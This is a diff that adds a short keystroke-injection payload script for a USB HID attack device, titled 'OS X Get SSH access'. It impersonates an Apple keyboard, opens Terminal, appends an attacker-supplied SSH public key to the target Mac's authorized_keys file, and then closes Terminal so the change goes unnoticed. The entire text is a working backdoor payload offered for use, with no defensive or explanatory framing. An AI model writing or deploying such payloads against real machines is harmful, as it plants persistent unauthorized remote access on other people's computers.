@@ -1,0 +1,17 @@
+REM Title: OS X Get SSH access
+REM Author: Jesse Wallace (c0deous)
+REM This script adds a ssh public key to the authorized_keys file on a target's mac.
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+COMMAND SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 800
+STRING echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys
+ENTER
+DELAY 1000
+STRING killall Terminal
+ENTER
+REM Note: you may shorten the times if you think they are too slow.  I made them to accomodate older macs that can't get around very fast.
